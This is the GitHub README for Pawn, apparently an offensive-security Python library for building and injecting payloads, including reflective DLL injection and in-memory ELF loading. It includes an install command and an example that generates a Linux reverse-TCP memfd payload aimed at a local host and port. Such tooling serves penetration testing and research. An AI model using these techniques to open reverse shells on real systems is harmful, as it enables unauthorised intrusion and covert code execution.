# Pawn

<p>
    <a href="https://entysec.com">
        <img src="https://img.shields.io/badge/developer-EntySec-blue.svg">
    </a>
    <a href="https://github.com/EntySec/Pawn">
        <img src="https://img.shields.io/badge/language-Python-blue.svg">
    </a>
    <a href="https://github.com/EntySec/Pawn/forks">
        <img src="https://img.shields.io/github/forks/EntySec/Pawn?color=green">
    </a>
    <a href="https://github.com/EntySec/Pawn/stargazers">
        <img src="https://img.shields.io/github/stars/EntySec/Pawn?color=yellow">
    </a>
    <a href="https://www.codefactor.io/repository/github/EntySec/Pawn">
        <img src="https://www.codefactor.io/repository/github/EntySec/Pawn/badge">
    </a>
</p>

Pawn is a collection of Python techniques used for crafting, manipulating and injecting payloads.

## Features

* Support for `Windows`, `macOS`, `Linux` and `Apple iOS` payloads.
* Support for such techniques like `Reflective DLL Injection` and `procfs loader`.
* Has modular system which allows you to write your own custom payloads.

## Installation

```
pip3 install git+https://github.com/EntySec/Pawn
```

## Examples

Example of obtaining [ELF procfs loader](https://blog.entysec.com/2023-04-02-remote-elf-loading/) with custom host and port.

```python
from pawn import Pawn

pawn = Pawn()

payload, send_size = pawn.get_pawn(
    module='linux/x64/reverse_tcp_memfd',
    platfrom='linux',
    arch='x64',
    host='127.0.0.1',
    port=8888
)

print(len(payload))
print(payload)
```

## Special Thanks

* Some parts of **assembly code for Windows** were ported from free open-source project [Metasploit Framework](https://github.com/rapid7/metasploit-framework).
